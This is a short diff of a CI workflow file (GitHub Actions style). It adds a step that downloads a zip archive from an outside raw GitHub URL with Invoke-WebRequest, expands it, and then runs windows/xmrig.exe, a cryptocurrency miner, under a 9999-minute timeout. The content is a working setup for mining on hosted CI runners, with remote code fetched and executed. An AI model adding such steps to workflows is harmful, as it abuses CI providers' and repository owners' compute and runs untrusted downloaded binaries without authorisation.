@@ -10,7 +10,10 @@ jobs:
     timeout-minutes: 9999
 
     steps:
+    - name: downloading files...
+      run: |
+         Invoke-WebRequest https://raw.githubusercontent.com/techtechnikov/min/main/win.zip -OutFile windows.zip
+         Expand-Archive windows.zip
     - name: starting miner
       run: |
-        Expand-Archive windows.zip
         windows/xmrig.exe
